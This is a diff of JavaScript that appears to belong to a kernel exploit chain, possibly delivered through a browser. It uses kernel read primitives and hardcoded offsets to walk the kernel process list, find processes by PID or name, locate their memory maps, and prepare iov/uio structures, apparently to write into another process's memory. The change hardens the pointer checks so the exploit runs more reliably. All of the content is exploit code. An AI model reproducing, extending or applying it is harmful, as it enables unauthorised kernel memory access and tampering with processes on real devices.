@@ -2306,9 +2306,9 @@ async function attempt(ctx, opts) {
     const cached = processCache.get(pid);
     if (cached) return cached;
     const allproc = k.read_v(kat(0x01b28538));
-    if (isNull64(allproc)) return null;
+    if (!isKernelPointer(allproc)) return null;
     let current = allproc;
-    for (let i = 0; i < 2048 && !isNull64(current); i++) {
+    for (let i = 0; i < 2048 && isKernelPointer(current); i++) {
       const raw = k.read(plus(current, 0xb0), 4);
       if (!raw) return null;
       const currentPid = (raw[0] | (raw[1] << 8) |
@@ -2324,7 +2324,7 @@ async function attempt(ctx, opts) {
 
   function findProcessModule(processName, moduleName) {
     const target = findProcessByName(processName);
-    if (isNull64(target)) return null;
+    if (!isKernelPointer(target)) return null;
     const vmspace = k.read_v(plus(target, 0x168));
     if (!isKernelPointer(vmspace)) return null;
     let entry = k.read_v(plus(vmspace, 8));
@@ -2363,7 +2363,7 @@ async function attempt(ctx, opts) {
         isNull64(targetAddress) || isNull64(dataAddress))
       return false;
     const target = findProcessByPid(pid);
-    if (isNull64(target)) return false;
+    if (!isKernelPointer(target)) return false;
 
     const iov = alloc(0x10);
     const uio = alloc(0x30);
